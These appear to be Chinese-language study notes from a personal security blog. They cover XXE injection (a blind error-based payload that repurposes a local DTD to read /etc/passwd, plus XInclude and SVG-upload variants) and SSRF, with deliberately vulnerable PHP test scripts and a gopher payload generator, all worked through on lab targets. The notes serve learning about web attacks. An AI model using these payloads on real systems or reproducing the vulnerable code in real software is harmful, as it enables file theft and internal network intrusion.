<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % custom_entity &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure>

<p>①定义参数实体local_dtd，从服务器本地文件schema.dtd获取。</p>
<p>②参数实体custom_entity在schema.dtd文件中已存在，重新定义。可以看到，包含的内容为【02retrieve data via error messages】的内容.相当于重写了要攻击的服务器schema.dtd文件的custom_entity内容。在shema.dtd文件调用参数实体custom_entity的时候，其实执行的是重定义的内容。</p>
<p>这样的话，即使不能在内部dtd声明中直接调用%file参数实体，但是可以在内部dtd重定义外部本地dtd文件的内容，使得外部本地dtd含有【通过报错显示敏感信息】的代码</p>
<p>==<strong>③这里需要注意的就是一些特殊符号的问题</strong>==</p>
<p>&amp;#x25;===&gt;%[HTML entity reference]</p>
<p>&amp;#x26;===&gt;&amp;</p>
<p>&amp;#x27;===&gt;’</p>
<p>逻辑：</p>
<p>①首先，%file包含我想要读的敏感信息。要读%file，在盲XXE的情况下，只能通过引起报错返回报错信息中含有敏感信息来读取。</p>
<p>这是我们要使用的dtd代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;//注意%file;最后一定要加上分号</span><br><span class="line">%eval;</span><br><span class="line">%error; </span><br></pre></td></tr></table></figure>

<p>②第二，由于要在声明中含有%file。内部dtd不支持，只能使用外部dtd的方法。要使用外部dtd的方法，由于out-of-band interactions are blocked，不能从attacker的服务器中获取。所以只能从靶机的本地dtd文件着手。</p>
<p>③我们无法改变靶机的dtd文件。但是，我们可以利用</p>
<p> <code>If a document&#39;s DTD uses a hybrid of internal and external DTD  declarations, then the internal DTD can redefine entities that are  declared in the external DTD. </code></p>
<p>的特性，来改写靶机dtd文件的实体。这样执行靶机文件dtd对应的那个实体代码时，其实执行的是我重写的那部分。</p>
<p>我们可以将第①步使用的dtd代码，作为改写的内容。那么就相当于把这个代码写入到外部dtd。那我们的声明中含有%file的问题就迎刃而解了</p>
<h5 id="例题：-3"><a href="#例题：-3" class="headerlink" title="例题："></a>例题：</h5><p>已知靶机有existing DTD file at <code>/usr/share/yelp/dtd/docbookx.dtd</code> containing an entity called <code>ISOamso.</code></p>
<img src="D:\blog\H01iday\source\_posts\pics\xxe23.png" alt="xxe23" style="zoom: 80%;" />

<img src="D:\blog\H01iday\source\_posts\pics\xxe24.png" alt="xxe23" style="zoom:67%;" />



<p><strong>如何找到local DTD？</strong></p>
<p>这个攻击方式很重要的一点在于知道靶机的已有的dtd文件的位置。</p>
<p>不同的系统和环境都有一些默认的常见的DTD文件的位置。可以在网上找到具体的信息</p>
<p> You can test whether this file is present by submitting the following  XXE payload, which <strong>will cause an error if the file is missing</strong>:        </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure>

<p>在找到对应文件的信息之后，由于很多dtd文件都是开源的。检索对应文件的信息，找到可以进行redefine的entity进行攻击。</p>
<h2 id="XXE注入的隐藏攻击面"><a href="#XXE注入的隐藏攻击面" class="headerlink" title="XXE注入的隐藏攻击面"></a>XXE注入的隐藏攻击面</h2><h3 id="XInclude-attacks"><a href="#XInclude-attacks" class="headerlink" title="XInclude attacks"></a>XInclude attacks</h3><h4 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h4><p>有的应用程序允许用户提交部分数据，作为服务器端XML文档的一部分，再解析文档。</p>
<p>在这种情况下，以前的方法都不管用。因为我们无法像前面一样对XML文档的内容直接进行控制，也无法编写dtd的内容。</p>
<p>那么就可以使用xinclude。</p>
<h4 id="Xinclude是什么："><a href="#Xinclude是什么：" class="headerlink" title="Xinclude是什么："></a>Xinclude是什么：</h4><p><code>XInclude</code> is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an <code>XInclude</code> attack <strong>within any data value</strong> in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.</p>
<h4 id="Xinclude如何使用："><a href="#Xinclude如何使用：" class="headerlink" title="Xinclude如何使用："></a>Xinclude如何使用：</h4><p>只有两个变量：</p>
<p>include和fallback</p>
<p>xi前缀名可以任意取</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;http://msdn.microsoft.com/rss.xml&quot;</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span>Sorry, MSDN news are unavailable.<span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>xi:include</code>defines which document to include and how</p>
<ul>
<li>href：对要包括的文档的 URI 引用。</li>
<li>parse：它的值可以是“xml”或“text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是“xml”。</li>
<li>XPointer：这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。</li>
<li>encoding：作为文本包括时，该属性提供所包括文档的编码提示信息。</li>
</ul>
<p><code>xi:fallback</code>：当include的内容is unavailable for any reason，content of the <code>xi:fallback</code> element is included instead.</p>
<p><code>xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;</code>这是规定命名空间</p>
<h4 id="实战栗子："><a href="#实战栗子：" class="headerlink" title="实战栗子："></a>实战栗子：</h4><p><img src="D:\blog\H01iday\source_posts\pics\xxe15.png" alt="xxe15"></p>
<p>因为是讲Xinclude插入到data value中，故我这里讲productId的1改为我的Xinclude 内容</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe16.png" alt="xxe15"></p>
<p>成功获得/etc/passwd中的内容</p>
<img src="D:\blog\H01iday\source\_posts\pics\xxe17.png" alt="xxe15" style="zoom:67%;" />



<h3 id="XXE-attacks-via-file-upload"><a href="#XXE-attacks-via-file-upload" class="headerlink" title="XXE attacks via file upload"></a>XXE attacks via file upload</h3><p>SVG和DOCX都是<strong>XML-based format</strong> </p>
<h4 id="SVG是什么"><a href="#SVG是什么" class="headerlink" title="SVG是什么"></a>SVG是什么</h4><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式。并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p>
<p>嵌入式SVG的源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>xmlns规定命名空间。</p>
<p>【例如SVG&lt; a&gt;元素和HTML&lt; a&gt;如果一个被称为svg：a和另一个html：a,则可以区分该元素===》这里就是规定了用svg技术的命名空间】</p>
<p>xlink这是一个建立超链接的东西，xmlns:xlink是说xlink的命名空间<code>http://www.w3.org/1999/xlink</code></p>
<p>svg&lt;test&gt;定义文本元素</p>
<h4 id="例题：-4"><a href="#例题：-4" class="headerlink" title="例题："></a>例题：</h4><p>该comment应用允许用户上传头像</p>
<p> Apache Batik library 处理（support SVG images. ）</p>
<p>目的：displays the contents of the <code>/etc/hostname</code> file </p>
<p>①上传comment，头像上传的为svg文件</p>
<img src="D:\blog\H01iday\source\_posts\pics\xxe26.png" alt="xxe26" style="zoom:67%;" />

<p>由此可以看到svg文件的内容</p>
<img src="D:\blog\H01iday\source\_posts\pics\xxe27.png" alt="xxe26" style="zoom:80%;" />

<p>/etc/hostname文件中的内容会被作为text内容显示在头像中</p>
<img src="D:\blog\H01iday\source\_posts\pics\xxe25.png" alt="xxe26" style="zoom: 50%;" />



<h3 id="XXE-attacks-via-modified-content-type"><a href="#XXE-attacks-via-modified-content-type" class="headerlink" title="XXE attacks via modified content type"></a>XXE attacks via modified content type</h3><p>post request</p>
<p><code>application/x-www-form-urlencoded</code>. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.        </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//普通的post方法,一般网页期待收到这种格式的写法</span><br><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">foo=bar</span><br><span class="line">//但其它格式网页也可能能tolerate</span><br><span class="line">Then you might be able submit the following request, with the same result:</span><br><span class="line"></span><br><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 52</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt; </span><br></pre></td></tr></table></figure>

<p>如果下面这种形式能够被成功接收的话，说明靶机能够接收xml message，这样就可以通过拦截修改post体内容来发起xxe攻击</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/15/DNSpod/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/15/DNSpod/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-10-15 18:52:36" itemprop="dateCreated datePublished" datetime="2021-10-15T18:52:36+08:00">2021-10-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/10/SSRF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/10/SSRF/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-10-10 19:36:14" itemprop="dateCreated datePublished" datetime="2021-10-10T19:36:14+08:00">2021-10-10</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-25 13:01:29" itemprop="dateModified" datetime="2021-10-25T13:01:29+08:00">2021-10-25</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SSRF服务器端请求伪造"><a href="#SSRF服务器端请求伪造" class="headerlink" title="SSRF服务器端请求伪造"></a>SSRF服务器端请求伪造</h1><h2 id="01产生漏洞的函数"><a href="#01产生漏洞的函数" class="headerlink" title="01产生漏洞的函数"></a>01产生漏洞的函数</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><h4 id="具体说明："><a href="#具体说明：" class="headerlink" title="具体说明："></a>具体说明：</h4><p>​        file_get_contents( string <code>$filename</code>）</p>
<p>​        filename是文件或URL的名称。</p>
<h4 id="函数作用："><a href="#函数作用：" class="headerlink" title="函数作用："></a>函数作用：</h4><p>​        将整个文件读入一个字符串</p>
<h4 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h4><p>​        需要将php.ini的allow_url_fopen设置为On</p>
<h4 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h4><p>​        测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\ssrf3.png" alt="ssrf3"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\ssrf2.png" alt="ssrf2"></p>
<h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h3><h4 id="具体说明：-1"><a href="#具体说明：-1" class="headerlink" title="具体说明："></a>具体说明：</h4><p>readfile(filename）</p>
<p>该函数和file_get_contents函数用法类似。</p>
<p>如果在 php.ini 文件中 “fopen wrappers” 已经被激活，可以在本函数中把 URL 作为文件名来使用。</p>
<h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><h4 id="具体说明：-2"><a href="#具体说明：-2" class="headerlink" title="具体说明："></a>具体说明：</h4><p>fsockopen(string <code>$hostname</code>, int <code>$port</code> = -1, int <code>&amp;$errno</code> = ?, string <code>&amp;$errstr</code> = ?, float <code>$timeout</code> = ini_get(“default_socket_timeout”)）<br>    $hostname：要进行连接的主机地址</p>
<p>​    $port：端口号。默认为-1表示不使用端口</p>
<p>​    $errno：如果<code>errno</code>的返回值为<code>0</code>，而且这个函数的返回值为**<code>false</code>**，那么这表明该错误发生在套接字连接（<code>connect()</code>）调用之前</p>
<p>​    $errstr：错误信息以字符串的信息返回。</p>
<p>​    $timeout：设置连接的时限，单位为秒</p>
<h4 id="函数作用：-1"><a href="#函数作用：-1" class="headerlink" title="函数作用："></a>函数作用：</h4><p>​    打开一个网络连接或者一个Unix套接字连接</p>
<p>​    fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。</p>
<h4 id="测试：-1"><a href="#测试：-1" class="headerlink" title="测试："></a>测试：</h4><p>​    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\ssrf4.png" alt="ssrf4"></p>
<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><h4 id="具体说明：-3"><a href="#具体说明：-3" class="headerlink" title="具体说明："></a>具体说明：</h4><p>​        见03curl内容</p>
<h4 id="函数作用：-2"><a href="#函数作用：-2" class="headerlink" title="函数作用："></a>函数作用：</h4><p>​        执行cURL 会话</p>
<h4 id="测试：-2"><a href="#测试：-2" class="headerlink" title="测试："></a>测试：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = curl_init(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">	</span><br><span class="line">	curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">	</span><br><span class="line">	<span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">	</span><br><span class="line">	curl_close(<span class="variable">$curlobj</span>); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\ssrf5.png" alt="ssrf5"></p>
<h2 id="02常用的协议"><a href="#02常用的协议" class="headerlink" title="02常用的协议"></a>02常用的协议</h2><p>以下所有协议用的测试代码，都是借助curl_exec来实现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = curl_init(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">	</span><br><span class="line">	curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">	</span><br><span class="line">	<span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">	</span><br><span class="line">	curl_close(<span class="variable">$curlobj</span>); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="File协议："><a href="#File协议：" class="headerlink" title="File协议："></a>File协议：</h3><h4 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h4><p>​        主要用于访问本地计算机中的文件。</p>
<h4 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///文件路径</span><br><span class="line">e.g：file:///E:/txt/index.txt</span><br></pre></td></tr></table></figure>



<p><img src="D:\blog\H01iday\source_posts\pics\ssrf6.png" alt="ssrf6"></p>
<h3 id="http协议："><a href="#http协议：" class="headerlink" title="http协议："></a>http协议：</h3><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><p>​        探测内网主机存活。一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</p>
<p>​        hosts文件包含了ip地址与主机名之间的映射，还包括主机的别名。</p>
<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>图中栗子是，已知外网ip为43.233。获取内网网段ip并且探测内网网段哪些ip地址的主机是存活的。</p>
<p>​    <img src="D:\blog\H01iday\source_posts\pics\ssrf7.png" alt="ssrf7"></p>
<p>我本地的栗子是，在iwebsec的虚拟机上实验。【外网ip192.168.201.132】</p>
<p>①通过file协议读取/etc/hosts文件，获得内网网段信息</p>
<p><img src="D:\blog\H01iday\source_posts\pics\ssrf8.png" alt="ssrf8"></p>
<p>②使用burp，探测172.17.0.x哪些ip地址的主机存活。</p>
<img src="D:\blog\H01iday\source\_posts\pics\ssrf9.png" alt="ssrf9" style="zoom:80%;" />

<img src="D:\blog\H01iday\source\_posts\pics\ssrf10.png" alt="ssrf9" style="zoom: 67%;" />

<img src="D:\blog\H01iday\source\_posts\pics\ssrf11.png" alt="ssrf9" style="zoom:67%;" />

<img src="D:\blog\H01iday\source\_posts\pics\ssrf12.png" alt="ssrf9" style="zoom:67%;" />

<p>可以发现内网【172.17.0.1和172.17.0.2两台主机存活】</p>
<h3 id="gopher协议："><a href="#gopher协议：" class="headerlink" title="gopher协议："></a>gopher协议：</h3><p>​            <strong>是什么？</strong></p>
<p>​            它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。Gopher协议支持发出GET、POST请求【默认端口为70】</p>
<p>​            <strong>限制？</strong></p>
<p><img src="D:\blog\H01iday\source_posts\pics\gopher.png" alt="gopher"></p>
<p>​            <strong>如何使用？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>

<p>​            <strong>Gopher发送HTTP GET请求？</strong></p>
<p>​                 1&gt;构造HTTP数据包</p>
<p>​                2&gt;URL编码、替换回车换行为%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
<p>​                3&gt;发送gopher协议</p>
<p>​                注意要素：</p>
<p>​                问号（？）需要转码为URL编码，也就是%3f<br>​                回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>​                在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>
<p>​                php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​                GET型的HTTP包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /ssrf/base/get.php?name=Margin HTTP/1.1</span><br><span class="line">Host: 192.168.201.1</span><br></pre></td></tr></table></figure>

<p>​            利用该脚本进行进一步生成符合Gopher格式的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 47.xxx.xxx.72</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line"><span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)<span class="comment"># 注意我在kali python2.7写法为urllib.quote(payload)</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>​                URL编码：</p>
<p>注意gopher协议似乎只能在linux下支持。我在windows下尝试不成功，在kali下即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.201.1:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.201.1%0d%0A</span><br><span class="line"></span><br><span class="line">成功得到结果 HelloMargin</span><br></pre></td></tr></table></figure>

<p>​            <strong>Gopher发送HTTP POST请求？</strong></p>
<p>​            php代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// echo.php</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello &quot;.$_POST[&quot;whoami&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>​            POST型的数据包：</p>
